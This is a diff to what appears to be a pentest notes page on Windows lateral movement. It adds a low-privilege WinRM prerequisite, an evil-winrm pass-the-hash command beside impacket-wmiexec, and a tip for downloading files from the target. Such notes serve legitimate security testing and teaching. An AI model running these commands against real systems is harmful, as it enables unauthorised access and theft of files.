@@ -23,7 +23,8 @@ TODO: Describe the vulnerability here.
 
 ## Prerequisites
 
-* Local administrator rights on the target machine.
+* Low-privileged account on your target.
+* WinRM service enabled on your target (default port is 5985).
 
 ## Exploit
 
@@ -81,12 +82,17 @@ New-PSSession -ComputerName $target -Credential $credential
 Enter-PSSession $id
 ```
 
-Finally, this exploit is also possible directly from Kali with impacket.
+Finally, this exploit is also possible directly from Kali with impacket or evil-winrm.
 
 ```bash
 impacket-wmiexec -hashes :$nt $username@$target
 impacket-wmiexec -hashes 00000000000000000000000000000000:$nt $username@$target
+
+evil-winrm -i $target -u $username -H $nt
 ```
+
+{: .important }
+> You can leverage evil-winrm to remotely download file from your target by invoking `download $path` command.
 
 ## Recommendations
 
